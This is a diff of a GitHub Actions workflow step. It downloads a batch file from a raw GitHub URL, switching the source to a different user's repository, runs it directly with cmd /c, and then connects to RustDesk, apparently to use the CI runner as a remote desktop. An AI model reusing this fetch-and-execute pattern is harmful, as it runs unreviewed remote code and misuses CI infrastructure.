@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/christinecphelps/final-rdp/main/.github/workflows/Downloads.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/iamjk43/y1/main/.github/workflows/Downloads.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
 
       - name: Connect to Rustdesk
